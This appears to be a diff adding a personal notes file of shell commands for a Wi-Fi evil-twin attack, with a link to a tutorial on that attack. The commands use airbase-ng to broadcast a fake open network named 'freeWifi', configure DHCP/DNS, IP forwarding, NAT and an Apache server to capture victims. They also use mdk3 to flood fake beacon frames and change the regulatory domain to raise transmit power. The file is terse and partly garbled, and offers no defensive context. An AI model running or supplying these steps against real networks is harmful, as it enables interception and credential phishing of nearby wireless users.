@@ -1,0 +1,56 @@
+iwconfig
+
+airbase-ng -e freeWifi -c 6 wlan0mon
+
+ifconfig wlan0mon 10.0.0.1/24 up
+ifconfig at0 10.0.0.1/24 up
+
+
+
+dnsmasq -C /etc/dnsmasq.conf -d
+
+
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+iptables -P FORWARD ACCEPT    
+
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+apache2ctl start
+
+
+====================================
+    2
+==================
+-1 iwconfig 
+
+-2 iw  wlan0 interface add mon0 type monitor
+-3 mdk3 mon0 b -f /root/fackwifi.lst
+
+
+
+seven+Square
+
+
+
+=============
+ifconfig wlan1mon down 
+iw reg set US
+ifconfig wlan1mon up 
+iwconfig wlan1mon 
+
+airbase-ng  -e "rootsh3ll" -c 1 wlan1mon
+
+ifconfig at0 10.0.0.1 up 
+
+https://rootsh3ll.com/evil-twin-attack/
+
+
+
+
+
+
+
+
